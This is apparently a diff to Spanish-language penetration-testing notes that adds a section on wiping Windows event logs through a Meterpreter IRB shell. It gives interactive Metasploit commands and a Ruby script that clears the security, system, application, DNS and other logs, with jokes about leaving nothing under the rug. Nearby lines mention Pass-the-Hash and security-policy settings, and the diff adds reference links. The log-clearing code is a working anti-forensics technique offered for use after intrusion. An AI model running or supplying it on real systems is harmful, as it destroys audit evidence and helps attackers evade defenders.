@@ -143,8 +143,34 @@ Listar procesos
 Stop PasssTheHash
 Secpol.msc/LocalPolicies/UserRightsAssignments/DebugPrograms       Delete Administrator/System
 
-"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
-
+""""""""""""""""""""""""""""""""Limpiar Eventos a través de Consola RUBY on Metasploit"""""""""""""""""""""""""""""""""""""""
+>>meterpreter>>irb
+            [*]Starting IRB Shell
+            [*]The 'client' variable node...
+             >>log = client.sys.eventlog.open ('system')
+             >>log.clear
+             >> ;););););););););););););)   y no queda nada abajo de la alfombra...
+             
+        Tambien podemos hacer un script con esto:
+        
+        					# Clears Windows Event Logs
+						evtlogs = [
+        					'security',
+        					'system',
+        					'application',
+        					'directory service',
+        					'dns server',
+        					'file replication service'
+        					]
+						print_line("Clearing Event Logs, this will leave an event 517")
+						evtlogs.each do |evl|
+        					print_status("Clearing the #{evl} Event Log")
+        					log = client.sys.eventlog.open(evl)
+        					log.clear
+						end
+						print_line("All Clear! You are a Ninja!")
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""             
+             
 
 Nota: Datos: 
 -EVXT es el formato de log de eventos
@@ -152,6 +178,7 @@ Nota: Datos:
 -Referencia: https://www.sans.org/reading-room/whitepapers/forensics/windows-logon-forensics-34132
              https://www.sans.org/reading-room/whitepapers/logging/evtx-windows-event-logging-32949
 -Directivas de Seguridad Local En WIN : secpol.msc
+-EventIDs List: http://ss64.com/ps/syntax-eventids.html
              
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<METASPLOIT FRAMEWORK>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
